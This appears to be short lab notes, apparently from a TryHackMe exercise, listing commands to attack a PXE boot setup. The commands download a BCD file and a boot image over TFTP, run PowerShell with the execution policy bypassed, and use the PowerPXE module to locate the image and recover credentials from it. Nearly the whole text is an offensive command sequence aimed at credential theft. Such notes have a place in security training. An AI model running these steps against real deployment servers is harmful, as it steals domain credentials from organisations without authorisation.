## PXE Boot Image Retrieval

	tftp -i <THMMDT IP> GET "\Tmp\x64{0F05D72F-5538-4603-A125-4407DC594B13}.bcd" conf.bcd

	powershell -executionpolicy bypass
	Import-Module .\PowerPXE.ps1
	$BCDFile = "conf.bcd"
	Get-WimFile -bcdFile $BCDFile

	tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim

## Recovering Credentials from a PXE Boot Image
	Get-FindCredentials -WimFile pxeboot.wim
